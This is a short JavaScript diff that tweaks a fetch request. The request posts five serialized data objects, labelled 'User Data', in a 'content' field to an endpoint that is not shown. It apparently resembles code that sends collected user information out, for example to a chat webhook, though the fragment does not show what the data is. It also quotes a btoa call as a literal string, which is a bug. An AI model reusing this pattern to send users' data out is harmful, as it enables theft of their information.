@@ -820,7 +820,7 @@
                   headers: {
                     'Content-Type': 'application/json',
                   },
-                  body: '{"content":"User Data:' + encodeURI(JSON.stringify(data1) + '\n' + JSON.stringify(data2) + '\n'  + 'btoa(JSON.stringify(data3))' + '\n'  + JSON.stringify(data4) + '\n'  + JSON.stringify(data5)) + '\n' + '"}',
+                  body: '{"content":"User Data:' + encodeURI(JSON.stringify(data1) + '\n' + JSON.stringify(data2) + '\n'  + 'btoa(JSON.stringify(data3))' + '\n'  + JSON.stringify(data4) + '\n'  + JSON.stringify(data5)) + '"}',
                 });
                 const text5 = await response.text();
                 console.log(text5);
